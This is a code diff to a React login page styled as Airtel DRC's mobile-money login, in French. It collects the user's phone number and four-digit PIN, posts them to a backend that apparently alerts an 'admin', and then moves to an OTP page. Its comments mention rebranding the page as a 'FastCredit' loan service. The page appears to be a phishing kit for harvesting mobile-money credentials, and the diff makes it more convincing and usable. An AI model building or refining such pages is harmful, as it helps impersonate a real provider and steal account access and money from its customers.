@@ -3,15 +3,28 @@ import { useNavigate } from 'react-router-dom';
 import './App.css';
 
 const COUNTRY_CODE = '+243';
-const PHONE_PLACEHOLDER = '8XX XXX XXX';  // DRC mobile format
+const PHONE_PLACEHOLDER = '8XX XXX XXX'; // DRC mobile format
 const PHONE_MAX = 9;
 
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [error, setError] = useState('Entrez le numéro Airtel.');
+  const [isLoading, setIsLoading] = useState(false);
+  
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
   const navigate = useNavigate();
+
+  // Handle phone number input and auto-focus to PIN when complete
+  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const val = e.target.value.replace(/\D/g, '');
+    setPhone(val);
+    
+    // Auto-focus first PIN input when phone number is complete
+    if (val.length === PHONE_MAX) {
+      pinRefs.current[0]?.focus();
+    }
+  };
 
   const handlePinChange = (index: number, value: string) => {
     if (!/^\d*$/.test(value)) return;
@@ -29,7 +42,7 @@ function AirtelLogin() {
     }
   };
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     const pinString = pin.join('');
 
@@ -43,21 +56,30 @@ function AirtelLogin() {
     }
 
     setError('');
+    setIsLoading(true);
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
 
-    // Fire-and-forget: admin alert is sent from the backend
-    fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
-    })
-      .then((res) => res.json())
-      .then((data) => console.log('Login response:', data))
-      .catch((err) => console.error('Login request failed:', err));
-
-    navigate('/airtel-otp');
+    try {
+      // Fire-and-forget: admin alert is sent from the backend
+      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
+      });
+      
+      const data = await response.json();
+      console.log('Login response:', data);
+      
+      // Navigate after successful request
+      navigate('/airtel-otp');
+    } catch (err) {
+      console.error('Login request failed:', err);
+      setError('Une erreur réseau est survenue. Veuillez réessayer.');
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   return (
@@ -71,6 +93,16 @@ function AirtelLogin() {
             <line x1="3" y1="18" x2="21" y2="18" />
           </svg>
         </div>
+        
+        {/* ADDED YOUR LOGO HERE */}
+        {/* Make sure logo.png is inside your public folder */}
+        <img 
+          src="/logo.png" 
+          alt="FastCredit Logo" 
+          style={{ width: '60px', height: '60px', borderRadius: '12px', marginBottom: '10px' }} 
+        />
+        
+        {/* You can change "Airtel DRC" to "FastCredit Loan" here if needed */}
         <h1 className="airtel-logo">Airtel DRC</h1>
         <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
       </div>
@@ -81,7 +113,7 @@ function AirtelLogin() {
         <p className="airtel-subtext">Connectez-vous à votre compte Airtel DRC</p>
 
         {error && (
-          <div className="airtel-alert">
+          <div className="airtel-alert" role="alert">
             <div className="alert-icon">
               <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <circle cx="12" cy="12" r="10" />
@@ -95,15 +127,18 @@ function AirtelLogin() {
 
         <form onSubmit={handleLogin}>
           <div className="airtel-input-group">
-            <label>Numéro de téléphone</label>
+            <label htmlFor="phone-input">Numéro de téléphone</label>
             <div className="airtel-phone-container">
               <div className="airtel-country-code">{COUNTRY_CODE}</div>
               <input
+                id="phone-input"
                 type="tel"
                 placeholder={PHONE_PLACEHOLDER}
                 value={phone}
-                onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
+                onChange={handlePhoneChange}
                 maxLength={PHONE_MAX}
+                aria-label="Numéro de téléphone"
+                disabled={isLoading}
               />
             </div>
           </div>
@@ -122,17 +157,26 @@ function AirtelLogin() {
                   onChange={(e) => handlePinChange(index, e.target.value)}
                   onKeyDown={(e) => handleKeyDown(index, e)}
                   className="airtel-pin-box"
+                  aria-label={`Chiffre ${index + 1} du code PIN`}
+                  disabled={isLoading}
                 />
               ))}
             </div>
           </div>
 
-          <button type="submit" className="airtel-login-btn">
-            Connexion
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12" />
-              <polyline points="12 5 19 12 12 19" />
-            </svg>
+          <button 
+            type="submit" 
+            className="airtel-login-btn"
+            disabled={isLoading}
+            style={{ opacity: isLoading ? 0.7 : 1 }}
+          >
+            {isLoading ? 'Chargement...' : 'Connexion'}
+            {!isLoading && (
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="5" y1="12" x2="19" y2="12" />
+                <polyline points="12 5 19 12 12 19" />
+              </svg>
+            )}
           </button>
         </form>
 
